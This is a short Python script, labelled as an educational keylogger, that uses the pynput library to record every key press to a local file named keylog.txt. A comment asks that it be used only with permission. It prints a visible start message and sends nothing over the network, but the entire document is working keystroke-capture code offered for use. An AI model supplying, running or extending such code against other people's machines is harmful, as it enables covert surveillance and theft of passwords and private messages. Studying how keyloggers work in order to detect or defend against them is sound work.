# -----------------------------------
# Simple Keylogger (Educational Use)
# -----------------------------------
# This script records key presses into a log file.
# IMPORTANT: Use only with permission and for learning purposes.

from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as file:
            file.write(f"[{key}]")

print("\n⌨️ Keylogger started... Press Ctrl + C to stop.")
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
